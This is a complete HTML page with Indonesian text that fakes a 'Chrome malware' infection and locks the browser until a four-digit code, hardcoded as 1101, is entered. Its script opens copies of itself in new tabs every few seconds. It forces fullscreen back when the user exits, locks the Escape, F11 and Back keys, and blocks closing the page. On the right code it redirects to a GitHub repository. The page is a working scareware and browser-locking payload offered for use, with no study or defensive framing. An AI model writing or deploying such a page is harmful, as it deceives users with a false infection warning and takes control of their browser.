<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>⚠️ SYSTEM INFECTED ⚠️</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body { height: 100%; overflow: hidden; font-family: 'Comic Sans MS','Chalkboard SE',cursive,system-ui; user-select: none; }

  body {
    background-color: #ffdf6b;
    background-image:
      radial-gradient(circle, rgba(0,0,0,.9) 1.4px, transparent 1.4px),
      radial-gradient(circle, rgba(0,0,0,.9) 1.4px, transparent 1.4px);
    background-size: 10px 10px, 10px 10px;
    background-position: 0 0, 5px 5px;
  }

  .poster {
    position: relative;
    width: 100%; height: 100%;
    display: flex; flex-direction: column;
    padding: 12px; gap: 12px;
    overflow-y: auto;
  }

  .status-bar {
    background: #000; color: #00ff88;
    border: 5px solid #000;
    box-shadow: 5px 5px 0 #e91e3c;
    padding: 8px 12px;
    text-align: center;
    font-size: 11px; font-weight: 900; letter-spacing: 2px;
    font-family: 'Courier New', monospace;
    flex-shrink: 0;
  }
  .status-bar.danger { background: #e91e3c; color: #fff; animation: flashBar .35s infinite; }
  .status-bar.safe   { background: #00e676; color: #000; }
  @keyframes flashBar { 50% { background: #000; color: #e91e3c; } }

  .skull-box {
    background: #fff;
    border: 6px solid #000;
    box-shadow: 8px 8px 0 #000;
    padding: 14px;
    display: flex; align-items: center; justify-content: center;
    position: relative; overflow: hidden;
    flex-shrink: 0;
  }
  .skull-box::after {
    content: ''; position: absolute; inset: 0;
    background: repeating-linear-gradient(45deg, transparent, transparent 14px, rgba(0,0,0,.05) 14px, rgba(0,0,0,.05) 16px);
    pointer-events: none;
  }
  .skull {
    font-size: 90px; line-height: 1;
    display: inline-block;
    filter: drop-shadow(5px 5px 0 #000);
    animation: skullShake .28s infinite;
  }
  @keyframes skullShake {
    0%,100% { transform: rotate(-7deg) scale(1); }
    50%     { transform: rotate(7deg) scale(1.09); }
  }

  .alert-box {
    background: #e91e3c;
    border: 6px solid #000;
    box-shadow: 8px 8px 0 #000;
    padding: 12px; text-align: center;
    flex-shrink: 0;
  }
  .alert-box h1 {
    color: #fff; font-size: 19px; font-weight: 900;
    letter-spacing: 1px; line-height: 1.25;
    text-shadow: 3px 3px 0 #000, -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000;
  }
  .alert-box .sub {
    color: #ffdf6b; font-size: 11px; font-weight: 900;
    margin-top: 6px; letter-spacing: 1.5px;
    text-shadow: 2px 2px 0 #000;
  }

  .display {
    background: #111;
    border: 6px solid #000;
    box-shadow: 8px 8px 0 #000;
    min-height: 64px; padding: 10px;
    display: flex; align-items: center; justify-content: center;
    gap: 10px; flex-shrink: 0;
  }
  .display .digit {
    width: 38px; height: 42px;
    border-bottom: 4px solid #00ff88;
    display: flex; align-items: center; justify-content: center;
    font-size: 28px; font-weight: 900; color: #00ff88;
    font-family: 'Courier New', monospace;
  }
  .display .digit.empty { border-bottom-color: #333; }
  .display .msg {
    color: #00ff88; font-size: 17px; font-weight: 900;
    letter-spacing: 2px; font-family: 'Courier New', monospace;
  }
  .display.error .digit { border-bottom-color: #ff2a4d; color: #ff2a4d; }
  .display.ok .digit    { border-bottom-color: #00e676; color: #00e676; }

  .keypad {
    display: grid; grid-template-columns: repeat(3,1fr);
    gap: 10px; flex-shrink: 0;
  }
  .key {
    background: #fff;
    border: 5px solid #000;
    box-shadow: 5px 5px 0 #000;
    padding: 13px 6px;
    font-size: 24px; font-weight: 900;
    color: #000; font-family: inherit; cursor: pointer;
    transition: transform .06s, box-shadow .06s;
  }
  .key:active { transform: translate(4px,4px); box-shadow: 1px 1px 0 #000; }
  .key.del { background: #ffdf6b; font-size: 16px; letter-spacing: 2px; }
  .key.ok  { background: #00e676; font-size: 18px; letter-spacing: 2px; }

  .warn-bar {
    background: #000; color: #ffdf6b;
    border: 5px solid #000;
    box-shadow: 6px 6px 0 #e91e3c;
    padding: 9px; text-align: center;
    font-size: 10px; font-weight: 900; letter-spacing: 2px;
    flex-shrink: 0;
  }
</style>
</head>
<body>

<div class="poster">
  <div class="status-bar" id="status">TAP HALAMAN UNTUK KUNCI LAYAR</div>
  <div class="skull-box"><span class="skull">💀</span></div>
  <div class="alert-box">
    <h1>SELAMAT ANDA TERKENA<br>MALWARE CHROME</h1>
    <div class="sub">ENTER UNLOCK CODE</div>
  </div>
  <div class="display" id="display">
    <div class="digit empty"></div>
    <div class="digit empty"></div>
    <div class="digit empty"></div>
    <div class="digit empty"></div>
  </div>
  <div class="keypad">
    <button class="key" data-k="1">1</button>
    <button class="key" data-k="2">2</button>
    <button class="key" data-k="3">3</button>
    <button class="key" data-k="4">4</button>
    <button class="key" data-k="5">5</button>
    <button class="key" data-k="6">6</button>
    <button class="key" data-k="7">7</button>
    <button class="key" data-k="8">8</button>
    <button class="key" data-k="9">9</button>
    <button class="key del" data-act="del">DEL</button>
    <button class="key" data-k="0">0</button>
    <button class="key ok"  data-act="ok">OK</button>
  </div>
  <div class="warn-bar" id="warn">⚠ TAB FLOOD AKTIF ⚠</div>
</div>

<script>
(() => {
  'use strict';

  const CODE      = '1101';
  const INTERVAL  = 3200;
  const TICK      = 100;
  const REDIRECT  = 'https://github.com/mraiseffendy-rgb/ddxdc.git';

  let input      = '';
  let floodTimer = null;
  let countTimer = null;
  let solved     = false;
  let flooding   = false;
  let nextOpenAt = 0;
  let forcingFull = false;   // flag anti-race saat paksa masuk fullscreen

  const display  = document.getElementById('display');
  const statusEl = document.getElementById('status');
  const warnEl   = document.getElementById('warn');
  const digits   = display.querySelectorAll('.digit');

  // ═══════════════════════════════════════════════════════
  //  FULLSCREEN
  // ═══════════════════════════════════════════════════════
  function isFull() {
    return !!(document.fullscreenElement ||
              document.webkitFullscreenElement ||
              document.mozFullScreenElement ||
              document.msFullscreenElement);
  }

  function enterFull() {
    const el = document.documentElement;
    const req = el.requestFullscreen || el.webkitRequestFullscreen ||
                el.mozRequestFullScreen || el.msRequestFullscreen;
    if (req) { try { req.call(el); } catch(e){} }
  }

  function exitFull() {
    const ex = document.exitFullscreen || document.webkitExitFullscreen ||
               document.mozCancelFullScreen || document.msExitFullscreen;
    if (ex) { try { ex.call(document); } catch(e){} }
  }

  // Kunci tombol Escape/Back selama fullscreen (Chrome 111+)
  async function lockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        await navigator.keyboard.lock(['Escape', 'F11', 'BrowserBack']);
      }
    } catch (e) {}
  }
  function unlockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════
  //  FLOOD
  // ═══════════════════════════════════════════════════════
  function clearTimers() {
    if (floodTimer) { clearTimeout(floodTimer);   floodTimer = null; }
    if (countTimer) { clearInterval(countTimer);  countTimer = null; }
  }

  function stopFlood() {
    flooding = false;
    clearTimers();
    statusEl.className = 'status-bar safe';
    statusEl.textContent = '✓ FULLSCREEN LOCKED — FLOOD PAUSED';
    warnEl.textContent = '✓ MODE AMAN — KELUAR FULLSCREEN = FLOOD LAGI';
  }

  function startFlood() {
    if (solved || isFull() || flooding) return;
    flooding = true;

    statusEl.className = 'status-bar danger';
    statusEl.textContent = '⚠ TAB FLOOD AKTIF — TAP UNTUK KUNCI LAYAR ⚠';

    nextOpenAt = Date.now() + INTERVAL;

    countTimer = setInterval(() => {
      if (!flooding || solved || isFull()) return;
      const remain = Math.max(0, nextOpenAt - Date.now());
      warnEl.textContent = `⚠ TAB BARU DALAM ${(remain / 1000).toFixed(1)}s ⚠`;
    }, TICK);

    const tick = () => {
      if (!flooding || solved || isFull()) return;
      if (Date.now() >= nextOpenAt) {
        try { window.open(location.href, '_blank'); } catch(e){}
        nextOpenAt = Date.now() + INTERVAL;
      }
      floodTimer = setTimeout(tick, 50);
    };
    floodTimer = setTimeout(tick, 50);
  }

  // ═══════════════════════════════════════════════════════
  //  FULLSCREEN CHANGE — ANTI-EXIT
  //  Kalau user keluar fullscreen tanpa solved → paksa masuk lagi
  // ═══════════════════════════════════════════════════════
  function onFsChange() {
    if (solved) return;

    if (isFull()) {
      // ── MASUK FULLSCREEN: stop flood + kunci keyboard
      forcingFull = false;
      stopFlood();
      lockKeyboard();
    } else {
      // ── KELUAR FULLSCREEN: PAKSA MASUK LAGI (anti-close)
      //    Tanpa ini user bisa lolos dengan ESC / F11
      if (!forcingFull) {
        forcingFull = true;
        // paksa masuk lagi segera
        enterFull();
        // retry kalau Chrome nolak (rate-limit)
        setTimeout(() => { if (!solved && !isFull()) enterFull(); }, 100);
        setTimeout(() => { if (!solved && !isFull()) enterFull(); }, 400);
      }
    }
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(ev => document.addEventListener(ev, onFsChange));

  // ═══════════════════════════════════════════════════════
  //  KLIK HALAMAN → fullscreen (kalau belum)
  // ═══════════════════════════════════════════════════════
  document.addEventListener('click', e => {
    if (e.target.closest('.key')) return;
    if (solved) return;
    if (!isFull()) enterFull();
  });

  // ═══════════════════════════════════════════════════════
  //  ANTI-CLOSE: sebelum unload kalau belum solved → block
  // ═══════════════════════════════════════════════════════
  window.addEventListener('beforeunload', e => {
    if (!solved) {
      e.preventDefault();
      e.returnValue = '';
      // coba masuk fullscreen lagi
      if (!isFull()) enterFull();
      return '';
    }
  });

  // ═══════════════════════════════════════════════════════
  //  DISPLAY + KEYPAD
  // ═══════════════════════════════════════════════════════
  function render() {
    for (let i = 0; i < 4; i++) {
      const d = digits[i];
      if (i < input.length) { d.textContent = input[i]; d.classList.remove('empty'); }
      else                  { d.textContent = '';        d.classList.add('empty');    }
    }
  }

  document.querySelectorAll('.key').forEach(btn => {
    btn.addEventListener('click', e => {
      e.stopPropagation();
      if (solved) return;

      const k = btn.dataset.k, act = btn.dataset.act;

      if (act === 'del') {
        input = input.slice(0, -1);
        display.classList.remove('error','ok');
        render();
        return;
      }
      if (act === 'ok') {
        if (input === CODE) onCorrect();
        else                onWrong();
        return;
      }
      if (k && input.length < 4) {
        input += k;
        display.classList.remove('error','ok');
        render();
      }
    });
  });

  // ═══════════════════════════════════════════════════════
  //  ON CORRECT — matikan semua + close tab + redirect GitHub
  // ═══════════════════════════════════════════════════════
  function onCorrect() {
    solved = true;
    flooding = false;
    clearTimers();
    unlockKeyboard();

    // hapus flag kalau ada
    try {
      localStorage.removeItem('rz_malware_closed');
      localStorage.removeItem('rz_malware_url');
    } catch(e){}

    if (isFull()) exitFull();

    statusEl.className = 'status-bar safe';
    statusEl.textContent = '✓ UNLOCKED — CHROME DINORMALISASI';
    display.classList.add('ok');
    display.innerHTML = '<div class="msg">✓ UNLOCKED</div>';
    warnEl.textContent = '✓ MALWARE REMOVED — MEMBUKA GITHUB...';
    warnEl.style.background = '#00e676';
    warnEl.style.color = '#000';
    warnEl.style.boxShadow = '6px 6px 0 #000';

    // delay dikit biar user lihat status, lalu close + redirect
    setTimeout(() => {
      // coba close tab (works kalau tab ini script-opened)
      try { window.open('', '_self'); window.close(); } catch(e){}
      // fallback redirect ke GitHub
      setTimeout(() => {
        try { window.location.replace(REDIRECT); } catch(e) {}
      }, 250);
    }, 700);
  }

  function onWrong() {
    display.classList.add('error');
    display.animate([
      { transform: 'translateX(0)' },
      { transform: 'translateX(-10px)' },
      { transform: 'translateX(10px)' },
      { transform: 'translateX(-8px)' },
      { transform: 'translateX(8px)' },
      { transform: 'translateX(0)' }
    ], { duration: 300 });
    setTimeout(() => {
      input = '';
      display.classList.remove('error');
      render();
    }, 400);
  }

  render();
})();
</script>
</body>
</html>
